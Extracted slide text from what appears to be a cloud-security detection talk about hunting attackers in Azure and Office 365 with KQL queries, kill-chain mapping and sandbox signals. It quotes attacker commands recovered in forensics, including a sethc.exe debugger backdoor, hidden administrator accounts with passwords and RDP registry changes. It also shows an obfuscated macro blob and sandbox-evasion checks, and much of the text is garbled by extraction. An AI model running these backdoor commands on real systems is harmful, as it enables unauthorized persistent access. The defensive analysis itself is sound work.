ท Militarization of cyber space ท The "5th domain"
ท Geopolitics increasingly colors national views ท Data sovereignty
ท Supply chain attacks ท Cyber trickle down

The new form factors: Dual core, WiFi, Bluetooth,
runs Linux
OneDrive ท 12 billion files
Skype is the largest long distance provider ท 2 Billion mins/day
O365 ท 32M paid seats, 600K paid
tenants ท 35 PB of email data ท 15B messages per month
Outlook.com ท 400 Million active users

ท Miniaturization is shrinking computing form factors, all powered by cloud services
ท SMB and Enterprises seeking IT services through SaaS ท Adversaries and threats following them to the cloud ท Customers adapting to cloud threats

ท Demand for SaaS driving hyperscale cloud growth
ท Brings economic dividend driving down prices in compute, storage, and networking
ท Defenders harnessing new capabilities ท Some skillsets finding new life in cyber

200+ cloud services
1+ million servers
100+ datacenters in global cloud portfolio $15B+ infrastructure
investment

1 billion customers across enterprise and consumer segments
200+ cloud services

Actor Code Name
B
BORON

Industry Name APT3

He
HELIUM

APT17

C
CARBON

Wild Neutron

Sc APT8, APT18
SCANDIUM

10

Phish for Credentials

Reconnaissance

Formula
  = max(  (, ) -   (, ), 0) where : (, )  {0, 1}

ProdProcessCreationEvents | where NewProcessName endswith "\\reg.exe" | where CommandLine contains "Image File Execution Options" and CommandLine contains " add " | where CommandLine contains "\\sethc.exe" or CommandLine contains "\\magnify.exe" or CommandLine contains "\\utilman.exe" or CommandLine contains "\\osk.exe" | project Subscription , TimeCreated , NewProcessName, CommandLine , SubjectUserName , SubjectLogonId
2016-04-11 16:35:22.4527963 winlogon.exe 2016-04-11 16:35:22.4527963 winlogon.exe 2016-04-11 16:35:23.0309213 """LogonUI.exe"" /flags:0x0" 2016-04-11 16:35:27.1090463 C:\Windows\system32\userinit.exe 2016-04-11 16:35:27.5152963 C:\Windows\Explorer.EXE
2016-04-11 16:35:35.1246395 """C:\Windows\System32\ie4uinit.exe"" -EnableTLS" 2016-04-11 16:35:35.1402644 """C:\Windows\System32\ie4uinit.exe"" -DisableSSL3" 2016-04-11 16:35:35.1402644 """C:\Windows\System32\regsvr32.exe"" /s /n /i:U shell32.dll" 2016-04-11 16:35:35.7183857 """C:\Windows\System32\rundll32.exe"" C:\Windows\system32\mscories.dll 2016-04-11 16:35:36.1871327 C:\Windows\SysWOW64\runonce.exe /Run6432 2016-04-11 16:35:36.3746315 """C:\Program Files\McAfee\Agent\x86\UpdaterUI.exe"" /StartedFromRunKey" 2016-04-11 16:35:39.1714886 """C:\Windows\explorer.exe""" 2016-04-11 16:36:03.4213334 """C:\Windows\System32\cmd.exe"""
2016-04-11 16:36:15.2181329 "REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /v Debugger /t REG_SZ /d ""C:\windows\system32\cmd.exe"""

ProdProcessCreationEvents |where Subscription == "2e5d8c75-18cc-45d3-b580-7e09a91232fa" | where TimeCreated > datetime(2016-04-11 16:25:15.2181329) and TimeCreated < datetime(2016-04-17 16:50:15.2181329) |where Computer == "..." | where SubjectUserName == "..."| where NewProcessName endswith "\\cmd.exe" | where CommandLine contains "sethc" | project Subscription , TimeCreated , NewProcessName, CommandLine , SubjectUserName , SubjectLogonId

TimeCreated

CommandLine

2016-04-16 18:59 C:\windows\system32\cmd.exe sethc.exe 211

SubjectLogonId 0x3e7

Detections * Hits = Threat Intel + 1
ProdLoginAuditEvents | where TimeCreated > datetime(2016-04-15 23:10:25.9896262) and TimeCreated < datetime(2016-04-15 23:20:25.98962623)| where Subscription == "..." and VMName == "..." | project Subscription, TimeCreated ,Computer, TargetUserName , IpAddress , SubjectUserName , LogonType , IpPort

C:\Windows\Explorer.EXE

wrsd.exe 429308 z C:\Users\ADMINI~1\AppData\Local\Temp\3\wrsd.exe 429308 z
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f

reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticecaption /f

reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticetext /f

net user ASPNET crystal123!@# /add

net localgroup Administrators ASPNET /add net user ___VMware_Conv_SA___ crystal123!@# /add

reg delete ...legalnoticecaption

net localgroup Administrators ___VMware_Conv_SA___ /add

"C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE" SCODEF:4816 CREDAT:267521 /prefetch:2

"C:\Users\Administrator\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\FB7Z3X4W\TurboMailer-Setup.exe"

"C:\Program Files (x86)\TurboMailer\TurboMailer.exe"

net user ASPNET crystal123!@# /add

"C:\Windows\system32\NOTEPAD.EXE" "C:\Windows\system32\NOTEPAD.EXE"

CC::\\UUsseerrss\\AAddmmiinniissttrraattoorr\\DApepskDtaotpna\\4eL0ot0cak\l\4T0e0umkps.t\xe3t\rTem_p1__D_UVBM8.w2.zaipr\DeU_B8C.2o\cnonvfi_g.SiniA___

crystal123!@#

/add

"C:\Users\Administrator\AppData\Local\Temp\3\Temp1_DUB8.2.zip\DUnBe8.2t\DUBl8.o2.ecxae"lgroup Administrators ASPNET /add

net user guest "C:\Program Files (x86)\TurboMailer\turbomailer.exe"

net localgroup Administrators ___VMware_Conv_SA___ /add

... "C:\Windows\system32\NOTEPAD.EXE" C:\Users\Administrator\Desktop\april17.txt

"C:\Windows\system32\NOTEPAD.EXE" C:\Users\Administrator\AppData\Local\Temp\3\Temp1_march.zip\march.txt

"C:\Users\Administrator\Do"wCn:loa\dPs\rdno2.gexre"am Files (x86)\Internet Explorer\IEXPLORE.EXE" ""CC::\\UUsseerrss\\AAddmmiinniissttrraattoorr\\DDoo.ww.nn.llooaaTddess\\mfx..eepxxeeo""rary Internet Files\...\TurboMailer-Setup.exe"

"C:\Users\Administrator\Do"wCn:loa\dPs\ry.eoxeg"ram Files (x86)\TurboMailer\TurboMailer.exe" ""CC::\\UUsseerrss\\AAddmmiinniissttrraattoorr\\DDooNwwOnnTllooaaEddPss\\AdStnaD2b..leexE_eD"XUEBrutCe_:2.\1\UDsUBerurtes2\.1A(UdPmDAiTnE 0i3s.0t3.1r2a)\DtUoBrru\teD.exees" ktop\400k\400k.txt

"C:\Windows\system32\NOTEPAD.EXE" C:\Users\Administrator\Downloads\Stable_DUBrute_2.1\DUBrute 2.1 (UPDATE 03.03.12)\good.txt

"C:\Windows\system32\NOTEPAD.EXE" C:\Users\Administrator\Downloads\Stable_DUBrute_2.1\DUBrute 2.1 (UPDATE 03.03.12)\Logins.txt

""CC::\\WProingdroamwsF\islyesste(xm863)2\\GNoOoTgEleP\ACDh.rEoXmE"eC\A:\pUpsleicrast\iAodnm\cihnricostmhraetr.oerox\eDm"o-ew- ".nhlotetapxd:/se/\1S1ta9-b.1l-e0_.1D5U"1Bh.1ru2tt0et:_12p2.31:4\/D/3U./zBiypru"ste-2.h1 .(UyPDsA1TE6083..03c.1o2)m\P/as3sw.o0rd/s.t.xt../DUB_8.0.zip"

"C:\Windows\system32\rundll32.exe" C:\Windows\syste"mD32U\sBherllu32t.dell,.OpeexnAes_"RunDLL C:\Users\Administrator\Downloads\DUBrute 2.1 (UPDATE 03.03.12)\ssleay32.dll ""CC::\\WProingdroamwsF\islyesste(xm863)2\\GNoOoTgEleP\ACDh.rEoXmE"eC\A:\pUpsleicrast\iAodnm\cihnri"ostmCraet:.oer\x\eDW"o-iw- "nnhlotdtapod:/sw/\yDssU-h\B.rysus1tye6s82..c1to(emUPm/3D3.A0T/25E\4083N2.05O33T.6122E1)/\PScoIAunMDfigf.J.li7nEKi X3TE55"61HgXoPJKo/DdU.Bt_8x.0t.zip"

"C:\Windows\system32\NOTEPAD.EXE" C:\Users\Admini"stCrat:or\\DWoiwnnlodaodsw\DsU\Brsutye_s8t.0\eadmm3in2.t\xtNOTEPAD.EXE" Logins.txt ""CC::\\WUsienrdso\Awdsm\siynsitsetmra3to2r\\NDOoTwEnPlAoDad.EsX\ED"UCB:r\uUtsee_r8s.\0A\dDmUiBnri"usttCrea.t:eoxr\e\"DWoiwnnlodaodsw\DsU\Brsutye_s8t.0\epmas3sw2or\d.NtxOt TEPAD.EXE" Passwords.txt

Exploit any detection to devise cloud kill chain coverage

Reconnaissance

Weaponization

Delivery

Exploitation

Installation

C2

Actions on Intent

Port Scanning potential victims

Installation of RDP brute-forcing tools, email lists installed for spamming, ...

RDP brute forcing, SQL injection, Elastic Search injection, exploits for known server vulnerabilities, ...

Host detection

Successful login with brute forced credential, successful SQLi, ...
A detection fires... Malware installed
Malware communicates for updates

Spam, Bitcoin mining, ...

Forensics Detection

Analyst Investigation

Investigation is performed, identifying: ท New analytic ideas ท New TI

Crash Detection

Network Detection
Exploit the "Fibonacci model" to build detection arsenal: 1 analytic leads to... 1 detection. Investigation yields... 2 more attack elements. Searching all tenants leads to... 3 more affected tenants. Investigating them leads to... 5 new attack elements. Adding coverage leads to... ...Iterate until the closure of the pivoting

Infinite possibilities to evade AV signatures
APBDDDDDOTxEBcjUFFyioiktuiiinhxo8zsoVmrmitbmmmiiVBsQrPPBlPnP(BPOf"AAAAAa6rlEstCX72ByBnrryprrriVAAAAAlcLiiUjLerDDPUujeVuyiitOiiilwCAAAAb+-81(-SIDDepwI(+88bcszriroF5U5SHiafEVvvevvvveBABAAAefii-9-u33jkofuQstjocuNeLjlBmlfraaa,eaaasvACAAAtmm88721p87ujl4XqtF27UYrun3==84YierlttrttttAAAEAA40011v7,yhfM3EPteuuUkumcT8QuYeeleeerHgHAEABlro81627u)sepjnmi9reQSesKerWL&eSXoon5ohet0ZenhAUQGTLraiIEIAUAlyp60ehIhsTmKhQKhiSS77p,1cjkcpyd2r0cepLni:KaML5VoheDDpDDSnACACAOpVTJthkhGISlhDahVcc)+d4gujov().)Aot8AVtoH1IYBTieepeeugaAbAZAPaenRpDdpoUGHphtpbrr,+,+y(8zyhxN=bszi8sK.na1l_osA=gecceccbwAwAAAalmozSUzTTxQzMdzbii9u,djnnuu-=oe2D6=UWNcDstslldllBABMBItp=rMSbrbuUWrGxrHpp(73rcpmp(3U2IInaIj67kCaBo0huaaaazA3ApBhFdrcOktt4126(kovbv=-p=7Bn1nNhbcOmocIrrrrABAAA/NimAfwur=&&=&=&&&=&f..57982mxeu2e8ot=xtGi8FAeVunTeeeeeHAHAH/alAsiNni00LE&4)5cnrp2dS2uaAekAeA9dB6sCmtoAAMAQ/meslubpavelleteclzef),1d1up8)nfsisgsUtXglDe=NFFFFAAAHA/eNLemltGnahPhrYbhBlhn),5ygl=<+dpei6eqfP=V5gUeLuuuuYAZAb/aosbahnAglhhVwhbJhs(u+-(bi>kSrYLIrIMuUaNt"esnnnnQPQAw/mxAntecoT(--bp,rt3htpQUupxZOplPpM=8nnW(TrA3.SrQtccccB/BAB/engsrrkhhazjubzHuzY3ykzr((9(.4-4r(5mtt2l/hiTAg,2gttttj/yAy/)iOirqcgrIGcrnyruCe5fjLe6924b3E4iAYqeesiia0U4uiiiiA/A/A/Snfc,AIBenLrh0ihe87736ux6nrltggdYjsnsHjSooooG/A/A/AtgBes&&&&&&&&&eh5)vnn)556ppgrQeeKAzDtWm8HennnnU8A/A/sryB(ap,ep(&&&=,298va+aw)C0rrS5so)TaL8AAA/A/ityS)=tznvLxtchdDKZ,)unybooY7cZ248IAA/A/LnetCWGGVBDeAcrR(fxVtPyssCk(,+pd6(-luzlUuAjsQeAAAwA/ogsarflreeeu(XONR.nRtymDRYDfd)E2)p--cW5msnna(BAAAA/n,TliioittlbGDCiVNUbfbC(4yn3,Vjv-899)mICeIM1JTAAAA/gonlstTTSjaKrhaDllPJOUL58uv)yu4817()nVHISAAAAAAWgeeeeelBueteHjetQLcChFu94i,(,p5305taP1bBHAAAAAr)sHFmmpya97r-=1d952tJcuqyardH.r4U4QAAAAAitBaippVLtJt68)&&&&o(y)2pMixkOVAAAAAAtuArnlPFae&&&&&&(&,n2u++w6ekaKOraYAAAAAesideailfTCBS&Hj&m2+-)oT4dNn"FalQAAAAAnfltlntWetQhKBXife1e1l,89h4uc65BAAAAALgeeLAhelDoxsRcWoQvmMz8n7yN92eg54fKtJ0AAAAAroisNptZbLPPTsEWv9t6NNPq(m88n+b89AvSAAAAAAnbaPLL+FIpFurviYtBEQ,S6iyy78--r6s,bGAAAAAgLmrAiitwirRRruJpPvr1tzP))23(1T4UAAAAA"oeesbbflFPAMhnWW(rpaaa,,7)2-A6)oIcOAAAAAAknfieOLUIP3i,uY&&)2,0r7n8rAAAAAASegi""lL3n&&&&U((73r6((jtBaAAAAAAr,xkkeit2g(2)17a-b-&&Y&&&&tzeX5AAAAAAnSreesb8s8vTxt&)yt3)y+u84sgPtAAAAAAietrrtlepWqGYy6zAANo7,(2p(-317eUvAAAAAAlrnnr"np1YcNZRCme5HQCAj,(1vp91Ur)AAAAAA3igeeikNDFWGRcwvxkQrQ5(126ue115AAAAAAA2n)llneulfAZbCnAJNbAN(497pd-6sAAAAAA"g33grm_RLslHqNYxfT027dHGu_+-0AAAAAA22nAbJXMEJTfz54)yg23)IAAAAAA(s""eA=eDWeHrO1&&&&&)ub678,nAAAAAAlBsrz&&r22)-tAAAAAAL(Af3yO&&nFe&w&&n<5+8(-(eAAAAAAoli2VSfBQZTtk>Ta)72AgAAAAAAiln"atBy,23)8r_HKRaWdXTrmpTeAAAAAAgaelryVJcPAFsf18DQoYX,2rprAAAAAAssAitaTBXKiORB(79AevQ5ae,AAAAAAtlnelhIKOsSvkh5)0cqhl_)ydAAAAAA"rigsFkBOurrZdo5,))(uAAAAAAia,WhGifNR5)ugmo&&&,2gAAAAAAnsrOel&&71,Fj4bdAAAAAAgibteB&&ML&s7(0rAAAAAA"tjTyoxl5(7,li&&&-(AAAAAAteeAG+VfMK,91kHKcsAAAAAAAecmseaWpO8Nxok2QAp(J5rAAAAAAntptlYHuJF13XD8BBj8o4rAAAAAAPLT7242aKdGUqTZVrCPAAAAAAaoeAAurzD8OErof0Gca0y-AAAAAAtnmssUA,cPjvT5)-(AAAAAAhgpnVuW&&&&&l,7(AAAAAAA,FLLiV&&(0-9-AAAAAAiooq"DTw&e&&t16-26ACAAAAlnnulUk&FDWGL458551AAAAAAegge(ppxinwbaYZT8)2499AAAAAAN),BBlMEFVGdfaW,)V567)AAAwAAauAyqPmiluLoJ)o70)WAAAAAAmABfsVmoDAhigBcX(N)+)AAAAAFesyfarITjXitg,+-ABAAAgAVeLl28QJudI&&&AQAAAALaro"J&&&(582RAAAAAAolnp&Lz&&F641-AAAFAAngAZtG&LsD3908AAAAAAg,sKRf&dwViOW2)3AAAAAArsuoZTVch)v)+5xxIbPeBxo,x,z3HVOhfxPFrWBUwlkkWoZTOxhox&&qgg&iEg&&&& xkiU6ALA8AmAqAtAQA0Ao"zcI = zfF40kszAh1zU.zqvhMF4qd(xki6L8mqtQ0ozcI, ...

248a5f02d176d2355bd6191724f5dcf49614fb4d

If Application.UserName = s("SPWSBPU", 19, 12) Then Error out
If Application.RecentFiles.Count < 3 Then Error out

{ "YourIPAddress": "98.173.91.135", "YourLocation": "Morristown, NJ, United States", "YourHostname": "wsip-98-173-91-135.lv.lv.cox.net",
"YourISP": "Cox Communications",
}
https://www.maxmind.com /geoip/v2.1/city/me
https://wtfismyip.com/json

Network Vetting
If ISP is on black list, error out with `bad

29

3000
2500 Sonar verdict 2000 received P15r0o0active threshold met
1000
500
0

CCoommmmoonn CCaammppaaiiggnn PPrrooffiillee ญญ NNeeww mmaallwwaarree vvaarriiaanntt -- BTeofdoarye
HFH Published

1

2 1 3 6 5 7 6

7

Signatures available

1. Static File Analysis ท Spoofed Icon, Obfuscated Macro,
Specific Signatures
2. Application Behavior Analysis ท Checks Recent File count, Shell
Breakout
3. Operating System Interactions ท Encrypts Files, Runs Powershell
cmd
4. Network Interactions ท Geo IP check, Unusual HTTP
headers, Downloads obfuscated Executable

SIGNALS
Azure network flows (IPFIX)

THE "CLOUD EFFECT"

ALERT

Learning using office365 labels SPAM / NOT SPAM

Differentiate between a network anomaly and a real
SPAM campaign

Questions?

